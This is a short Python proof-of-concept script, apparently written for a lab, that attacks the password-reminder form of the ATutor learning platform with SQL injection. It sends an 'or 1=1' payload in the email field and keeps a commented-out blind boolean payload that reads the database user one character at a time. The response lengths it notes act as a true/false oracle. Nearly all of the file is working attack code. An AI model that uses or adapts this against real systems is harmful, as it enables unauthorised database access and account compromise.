import requests
from bs4 import BeautifulSoup
cookies = {
    'ATutorID': '49kjboecoencmp1revslajula4',
    'flash': 'no',
    '_ga': 'GA1.1.2085987673.1629543005',
    '_gid': 'GA1.1.344197478.1629543005',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://atutor',
    'Connection': 'keep-alive',
    'Referer': 'http://atutor/ATutor/password_reminder.php',
    'Upgrade-Insecure-Requests': '1',
}

data = {#teacher' or 1=1#
  'form_password_reminder': 'true',
  #'form_email': 'test%27)/**/or/**/(select/**/ascii(substring((select/**/user()),1,1)))=114%23',
  'form_email': 'teacher%27/**/or/**/1=1',
  #'form_email': 'teacher@example.com',
  'submit': 'Submit'
}

response = requests.post('http://atutor/ATutor/password_reminder.php', headers=headers, cookies=cookies, data=data)
s = BeautifulSoup(response.text, 'lxml')
### 802 correct
### 826 error
print(len(s.text))
